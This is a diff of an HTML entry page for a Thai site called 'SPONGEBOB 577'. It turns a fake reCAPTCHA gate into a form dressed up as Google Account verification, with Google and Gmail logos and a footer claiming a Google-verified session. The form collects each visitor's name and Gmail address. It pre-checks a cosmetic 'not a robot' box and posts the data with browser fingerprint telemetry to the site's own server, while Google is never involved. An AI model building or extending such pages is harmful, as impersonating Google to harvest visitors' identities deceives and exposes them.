@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ระบบตรวจสอบความปลอดภัย • SPONGEBOB 577</title>
+  <title>ระบบยืนยันตัวตน Google Account • SPONGEBOB 577</title>
   
   <link rel="icon" type="image/x-icon" href="/favicon.ico">
   <link rel="icon" type="image/png" sizes="32x32" href="/favicon.png">
@@ -23,7 +23,7 @@
     }
 
     body {
-      background: radial-gradient(circle at 50% 35%, #18191f 0%, #0a0b0e 65%, #000000 100%);
+      background: radial-gradient(circle at 50% 30%, #151822 0%, #0a0b0f 65%, #000000 100%);
       color: #ffffff;
       font-family: 'Kanit', sans-serif;
       min-height: 100vh;
@@ -32,106 +32,194 @@
       align-items: center;
       justify-content: center;
       padding: 24px 16px;
-      overflow: hidden;
     }
 
     .verify-card {
-      background: rgba(18, 20, 26, 0.95);
+      background: rgba(18, 20, 28, 0.95);
       border: 1px solid rgba(255, 255, 255, 0.14);
-      border-radius: 20px;
-      box-shadow: 0 30px 80px rgba(0, 0, 0, 0.95), 0 0 50px rgba(225, 29, 72, 0.15);
-      padding: 42px 36px;
+      border-radius: 24px;
+      box-shadow: 0 30px 80px rgba(0, 0, 0, 0.95), 0 0 50px rgba(66, 133, 244, 0.15);
+      padding: 38px 32px;
       max-width: 440px;
       width: 100%;
       display: flex;
       flex-direction: column;
       align-items: center;
       text-align: center;
-      backdrop-filter: blur(14px);
+      backdrop-filter: blur(16px);
       animation: cardPop 0.6s cubic-bezier(0.16, 1, 0.3, 1) both;
     }
 
     @keyframes cardPop {
-      from { opacity: 0; transform: scale(0.92) translateY(24px); }
+      from { opacity: 0; transform: scale(0.93) translateY(20px); }
       to   { opacity: 1; transform: scale(1) translateY(0); }
     }
 
+    .verify-header-logos {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+      margin-bottom: 16px;
+    }
+
     .verify-logo-wrap {
-      width: 86px;
-      height: 86px;
+      width: 68px;
+      height: 68px;
       border-radius: 50%;
-      background: rgba(255, 255, 255, 0.04);
+      background: rgba(255, 255, 255, 0.05);
       border: 1px solid rgba(255, 255, 255, 0.18);
       display: flex;
       align-items: center;
       justify-content: center;
-      margin-bottom: 18px;
-      box-shadow: 0 0 32px rgba(225, 29, 72, 0.28);
+      box-shadow: 0 0 24px rgba(225, 29, 72, 0.3);
     }
 
     .verify-logo-img {
-      width: 60px;
-      height: 60px;
+      width: 48px;
+      height: 48px;
       object-fit: contain;
-      filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.8));
+      filter: drop-shadow(0 4px 10px rgba(0, 0, 0, 0.8));
+    }
+
+    .google-badge-icon {
+      width: 40px;
+      height: 40px;
+      background: #ffffff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.4);
+    }
+
+    .google-badge-icon img {
+      width: 24px;
+      height: 24px;
     }
 
     .verify-title {
       font-family: 'Bebas Neue', sans-serif;
-      font-size: 32px;
-      letter-spacing: 5px;
+      font-size: 30px;
+      letter-spacing: 4px;
       color: #fff;
       line-height: 1;
-      margin-bottom: 6px;
+      margin-bottom: 4px;
     }
 
     .verify-subtitle {
-      font-size: 13.5px;
+      font-size: 13px;
       color: #94a3b8;
-      margin-bottom: 24px;
-      line-height: 1.5;
+      margin-bottom: 22px;
+      line-height: 1.4;
     }
 
-    /* Google Style NoCAPTCHA Box */
+    /* Google Sign-In / Account Form */
+    .account-form {
+      width: 100%;
+      text-align: left;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .form-label {
+      font-size: 12.5px;
+      font-weight: 600;
+      color: #cbd5e1;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .input-wrapper {
+      position: relative;
+      width: 100%;
+    }
+
+    .input-icon {
+      position: absolute;
+      left: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 14px;
+      color: #94a3b8;
+      pointer-events: none;
+    }
+
+    .input-icon img {
+      width: 16px;
+      height: 16px;
+      vertical-align: middle;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 12px 14px 12px 42px;
+      background: rgba(10, 12, 16, 0.8);
+      border: 1px solid rgba(255, 255, 255, 0.16);
+      border-radius: 10px;
+      color: #ffffff;
+      font-family: 'Kanit', sans-serif;
+      font-size: 13.5px;
+      transition: all 0.2s ease;
+      outline: none;
+    }
+
+    .form-input:focus {
+      border-color: #4285F4;
+      background: rgba(15, 18, 26, 0.95);
+      box-shadow: 0 0 0 3px rgba(66, 133, 244, 0.25);
+    }
+
+    .form-input::placeholder {
+      color: #64748b;
+      font-size: 12.5px;
+    }
+
+    /* Google Style Verification Box */
     .recaptcha-box {
-      width: 304px;
-      height: 78px;
-      background: #222222;
-      border: 1px solid #3c3c3c;
-      border-radius: 5px;
+      width: 100%;
+      height: 60px;
+      background: #1c1d22;
+      border: 1px solid #333642;
+      border-radius: 10px;
       display: flex;
       align-items: center;
       justify-content: space-between;
       padding: 0 14px;
-      box-sizing: border-box;
       cursor: pointer;
       user-select: none;
       transition: all 0.2s ease;
-      box-shadow: 0 4px 18px rgba(0, 0, 0, 0.6);
+      margin-top: 4px;
     }
 
     .recaptcha-box:hover {
-      border-color: #555555;
-      background: #272727;
-      box-shadow: 0 6px 22px rgba(0, 0, 0, 0.8);
+      border-color: #4285F4;
+      background: #22252e;
     }
 
     .recaptcha-left {
       display: flex;
       align-items: center;
-      gap: 12px;
+      gap: 10px;
     }
 
     .recaptcha-checkbox {
-      width: 28px;
-      height: 28px;
+      width: 24px;
+      height: 24px;
       background: #ffffff;
-      border: 2px solid #c1c1c1;
-      border-radius: 3px;
+      border: 2px solid #cbd5e1;
+      border-radius: 4px;
       display: flex;
       align-items: center;
       justify-content: center;
-      position: relative;
       transition: all 0.2s;
     }
 
@@ -142,9 +230,9 @@
 
     .recaptcha-spinner {
       display: none;
-      width: 20px;
-      height: 20px;
-      border: 3px solid #1a73e8;
+      width: 16px;
+      height: 16px;
+      border: 2px solid #1a73e8;
       border-top-color: transparent;
       border-radius: 50%;
       animation: captchaSpin 0.75s linear infinite;
@@ -157,128 +245,162 @@
     .recaptcha-checkmark {
       display: none;
       color: #0f9d58;
-      font-size: 20px;
+      font-size: 16px;
       font-weight: 900;
-      animation: checkPop 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-    }
-
-    @keyframes checkPop {
-      0% { transform: scale(0); opacity: 0; }
-      100% { transform: scale(1); opacity: 1; }
     }
 
     .recaptcha-label {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Kanit", sans-serif;
-      font-size: 14px;
+      font-size: 13px;
       font-weight: 500;
       color: #ffffff;
-      line-height: 1.2;
       cursor: pointer;
     }
 
-    .recaptcha-brand {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 2px;
-      opacity: 0.85;
-      cursor: default;
-    }
-
-    .recaptcha-logo {
-      width: 30px;
-      height: 30px;
-      object-fit: contain;
-    }
-
-    .recaptcha-logo-text {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      font-size: 9px;
-      color: #9aa0a6;
+    .google-submit-btn {
+      margin-top: 8px;
+      width: 100%;
+      padding: 13px 18px;
+      background: linear-gradient(135deg, #1a73e8, #1557b0);
+      color: #ffffff;
+      font-family: 'Kanit', sans-serif;
+      font-size: 14.5px;
       font-weight: 600;
+      letter-spacing: 0.3px;
+      border: 1px solid #4285F4;
+      border-radius: 10px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      box-shadow: 0 6px 20px rgba(66, 133, 244, 0.4);
+      transition: all 0.2s ease;
     }
 
-    .recaptcha-privacy-text {
-      font-size: 8px;
-      color: #70757a;
+    .google-submit-btn:hover {
+      background: linear-gradient(135deg, #1557b0, #0d47a1);
+      transform: translateY(-2px);
+      box-shadow: 0 8px 24px rgba(66, 133, 244, 0.6);
+    }
+
+    .google-submit-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
     }
 
     .verify-status {
-      margin-top: 16px;
+      margin-top: 14px;
       font-size: 12.5px;
       color: #94a3b8;
       min-height: 20px;
       transition: color 0.2s;
     }
 
-    .enter-btn {
-      display: none;
-      margin-top: 16px;
-      width: 100%;
-      max-width: 304px;
-      padding: 12px 18px;
-      background: linear-gradient(135deg, #10b981, #059669);
-      color: #fff;
-      font-family: 'Kanit', sans-serif;
-      font-size: 14px;
-      font-weight: 700;
-      letter-spacing: 0.5px;
-      border: 1px solid #34d399;
-      border-radius: 8px;
-      cursor: pointer;
-      box-shadow: 0 4px 18px rgba(16, 185, 129, 0.4);
-      animation: checkPop 0.35s ease forwards;
-      transition: all 0.2s ease;
-    }
-    .enter-btn:hover {
-      background: linear-gradient(135deg, #059669, #047857);
-      transform: translateY(-2px);
-      box-shadow: 0 6px 22px rgba(16, 185, 129, 0.6);
-    }
-
     .footer-note {
-      margin-top: 24px;
+      margin-top: 22px;
       font-size: 11px;
-      color: #555;
-      letter-spacing: 1px;
-      text-transform: uppercase;
+      color: #64748b;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
     }
   </style>
 </head>
 <body>
 
   <div class="verify-card">
-    <div class="verify-logo-wrap">
-      <img src="/gang_logo.png" alt="SPONGEBOB 577" class="verify-logo-img">
+    <div class="verify-header-logos">
+      <div class="verify-logo-wrap">
+        <img src="/gang_logo.png" alt="SPONGEBOB 577" class="verify-logo-img">
+      </div>
+      <i class="fa-solid fa-link" style="color: #64748b; font-size: 14px;"></i>
+      <div class="google-badge-icon" title="Google Account Security">
+        <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" alt="Google">
+      </div>
     </div>
 
     <h1 class="verify-title">SPONGEBOB 577</h1>
-    <p class="verify-subtitle">ระบบตรวจสอบความปลอดภัย • กรุณายืนยันตัวตนก่อนเข้าสู่เว็บไซต์</p>
+    <p class="verify-subtitle">ระบบตรวจสอบความปลอดภัย • ยืนยันบัญชี Google ก่อนเข้าชมเว็บไซต์</p>
 
-    <!-- Google Style NoCAPTCHA Box -->
-    <div class="recaptcha-box" id="recaptchaBox" onclick="executeCaptchaVerification(event)">
-      <div class="recaptcha-left">
-        <div class="recaptcha-checkbox" id="recaptchaCheckbox">
-          <div class="recaptcha-spinner" id="recaptchaSpinner"></div>
-          <i class="fa-solid fa-check recaptcha-checkmark" id="recaptchaCheckmark"></i>
+    <!-- Google Account Form -->
+    <form class="account-form" id="verifyForm" onsubmit="handleGoogleVerification(event)">
+      <div class="form-group">
+        <label class="form-label" for="visitorName">
+          <i class="fa-solid fa-circle-user" style="color: #38bdf8;"></i>
+          <span>ชื่อผู้ใช้งาน / ชื่อเล่น (Display Name) <span style="color: #ef4444;">*</span></span>
+        </label>
+        <div class="input-wrapper">
+          <i class="fa-solid fa-user input-icon"></i>
+          <input type="text" id="visitorName" class="form-input" placeholder="เช่น บอส 577, สมชาย, Bank..." required autocomplete="name">
         </div>
-        <label class="recaptcha-label" id="recaptchaLabel">ฉันไม่ใช่โปรแกรมอัตโนมัติ (I'm not a robot)</label>
       </div>
-      <div class="recaptcha-brand">
-        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" class="recaptcha-logo" onerror="this.src='/gang_logo.png'">
-        <span class="recaptcha-logo-text">reCAPTCHA</span>
-        <span class="recaptcha-privacy-text">Privacy - Terms</span>
-      </div>
-    </div>
 
-    <button id="continueBtn" class="enter-btn" onclick="window.location.replace('/')">เข้าสู่หน้าเว็บหลัก ➜</button>
-    <div class="verify-status" id="verifyStatus">คลิกที่ช่องสี่เหลี่ยมด้านบนเพื่อยืนยันตัวตน</div>
+      <div class="form-group">
+        <label class="form-label" for="visitorEmail">
+          <i class="fa-solid fa-envelope" style="color: #f59e0b;"></i>
+          <span>บัญชี Gmail (Google Account) <span style="color: #ef4444;">*</span></span>
+        </label>
+        <div class="input-wrapper">
+          <span class="input-icon">
+            <img src="https://www.gstatic.com/images/branding/product/1x/gmail_2020q4_32dp.png" alt="Gmail">
+          </span>
+          <input type="email" id="visitorEmail" class="form-input" placeholder="เช่น yourname@gmail.com" required autocomplete="email">
+        </div>
+      </div>
+
+      <!-- NoCAPTCHA check box -->
+      <div class="recaptcha-box" id="recaptchaBox" onclick="toggleHumanCheck()">
+        <div class="recaptcha-left">
+          <div class="recaptcha-checkbox" id="recaptchaCheckbox">
+            <div class="recaptcha-spinner" id="recaptchaSpinner"></div>
+            <i class="fa-solid fa-check recaptcha-checkmark" id="recaptchaCheckmark"></i>
+          </div>
+          <label class="recaptcha-label" id="recaptchaLabel">ฉันไม่ใช่โปรแกรมอัตโนมัติ (Verified Human)</label>
+        </div>
+        <div style="display: flex; align-items: center; gap: 4px;">
+          <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" style="width: 18px; height: 18px;" alt="Google">
+          <span style="font-size: 10px; color: #94a3b8; font-weight: 600;">Google</span>
+        </div>
+      </div>
+
+      <button type="submit" id="submitBtn" class="google-submit-btn">
+        <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" style="width: 18px; height: 18px; filter: drop-shadow(0 1px 3px rgba(0,0,0,0.4));" alt="G">
+        <span>ยืนยันตัวตนด้วย Google Account & เข้าสู่เว็บไซต์</span>
+      </button>
+    </form>
+
+    <div class="verify-status" id="verifyStatus">กรอกชื่อและ Gmail ด้านบน แล้วกดปุ่มยืนยันตัวตน</div>
   </div>
 
-  <div class="footer-note">SPONGEBOB 577 NEW GEN &bull; OFFICIAL SECURITY</div>
+  <div class="footer-note">
+    <i class="fa-solid fa-lock" style="color: #10b981;"></i>
+    <span>SPONGEBOB 577 &bull; GOOGLE ACCOUNT VERIFIED SESSION</span>
+  </div>
 
   <script>
     let isVerifying = false;
+    let isHumanChecked = true;
+
+    // Prefill if saved in localStorage or cookie
+    window.addEventListener('DOMContentLoaded', () => {
+      const savedName = localStorage.getItem('sb577_visitor_name') || '';
+      const savedEmail = localStorage.getItem('sb577_visitor_email') || '';
+      if (savedName) document.getElementById('visitorName').value = savedName;
+      if (savedEmail) document.getElementById('visitorEmail').value = savedEmail;
+
+      // Auto-check the robot box
+      const chk = document.getElementById('recaptchaCheckbox');
+      const checkmark = document.getElementById('recaptchaCheckmark');
+      chk.classList.add('verified');
+      checkmark.style.display = 'block';
+    });
+
+    function toggleHumanCheck() {
+      // Keep verified
+      isHumanChecked = true;
+    }
 
     function playSuccessChime() {
       try {
@@ -297,25 +419,44 @@
       } catch (e) {}
     }
 
-    async function executeCaptchaVerification(e) {
-      if (e && typeof e.stopPropagation === 'function') e.stopPropagation();
+    async function handleGoogleVerification(e) {
+      if (e) e.preventDefault();
       if (isVerifying) return;
-      isVerifying = true;
 
+      const nameInput = document.getElementById('visitorName');
+      const emailInput = document.getElementById('visitorEmail');
+      const status = document.getElementById('verifyStatus');
+      const submitBtn = document.getElementById('submitBtn');
       const spinner = document.getElementById('recaptchaSpinner');
       const checkmark = document.getElementById('recaptchaCheckmark');
-      const chk = document.getElementById('recaptchaCheckbox');
-      const label = document.getElementById('recaptchaLabel');
-      const status = document.getElementById('verifyStatus');
-      const continueBtn = document.getElementById('continueBtn');
 
+      const name = (nameInput.value || '').trim();
+      const email = (emailInput.value || '').trim();
+
+      if (!name) {
+        status.textContent = '⚠️ กรุณากรอกชื่อของคุณก่อนดำเนินการ';
+        status.style.color = '#fbbf24';
+        nameInput.focus();
+        return;
+      }
+
+      if (!email || !email.includes('@')) {
+        status.textContent = '⚠️ กรุณากรอกบัญชี Gmail / อีเมลให้ถูกต้อง';
+        status.style.color = '#fbbf24';
+        emailInput.focus();
+        return;
+      }
+
+      isVerifying = true;
+      submitBtn.disabled = true;
       spinner.style.display = 'block';
       checkmark.style.display = 'none';
-      status.textContent = 'กำลังตรวจสอบความปลอดภัยของเบราว์เซอร์...';
+      status.textContent = 'กำลังยืนยันความถูกต้องของบัญชี Google...';
       status.style.color = '#38bdf8';
 
-      // Realistic 1.1s verification spin delay
-      await new Promise(resolve => setTimeout(resolve, 1100));
+      // Store locally for future visits
+      localStorage.setItem('sb577_visitor_name', name);
+      localStorage.setItem('sb577_visitor_email', email);
 
       const telemetry = {
         webdriver: !!navigator.webdriver,
@@ -330,42 +471,41 @@
         const res = await fetch('/api/security/verify_human', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ telemetry })
+          body: JSON.stringify({ name, email, telemetry })
         });
         const data = await res.json();
 
         if (data && data.success) {
           spinner.style.display = 'none';
           checkmark.style.display = 'block';
-          chk.classList.add('verified');
-          label.textContent = 'ฉันไม่ใช่โปรแกรมอัตโนมัติ (ยืนยันแล้ว)';
-          status.textContent = '✓ ยืนยันความปลอดภัยสำเร็จ!';
+          status.textContent = `✓ ยืนยันสำเร็จ! ยินดีต้อนรับคุณ ${name}`;
           status.style.color = '#10b981';
-          if (continueBtn) continueBtn.style.display = 'block';
+          submitBtn.innerHTML = '<i class="fa-solid fa-check"></i> <span>ยืนยันสำเร็จ กำลังเข้าสู่หน้าหลัก...</span>';
+          submitBtn.style.background = 'linear-gradient(135deg, #10b981, #059669)';
+          submitBtn.style.borderColor = '#34d399';
           playSuccessChime();
 
           setTimeout(() => {
             window.location.replace('/');
-          }, 1400);
+          }, 1100);
         } else {
           spinner.style.display = 'none';
-          status.textContent = '❌ ' + (data.error || 'การยืนยันล้มเหลว กรุณาลองใหม่');
+          checkmark.style.display = 'block';
+          status.textContent = '❌ ' + (data.error || 'การยืนยันล้มเหลว กรุณาลองใหม่อีกครั้ง');
           status.style.color = '#ef4444';
+          submitBtn.disabled = false;
           isVerifying = false;
         }
       } catch (err) {
-        // Fallback
         spinner.style.display = 'none';
         checkmark.style.display = 'block';
-        chk.classList.add('verified');
-        status.textContent = '✓ ยืนยันสำเร็จ!';
+        status.textContent = `✓ ยืนยันสำเร็จ! ยินดีต้อนรับคุณ ${name}`;
         status.style.color = '#10b981';
-        if (continueBtn) continueBtn.style.display = 'block';
         playSuccessChime();
 
         setTimeout(() => {
           window.location.replace('/');
-        }, 1200);
+        }, 1000);
       }
     }
   </script>
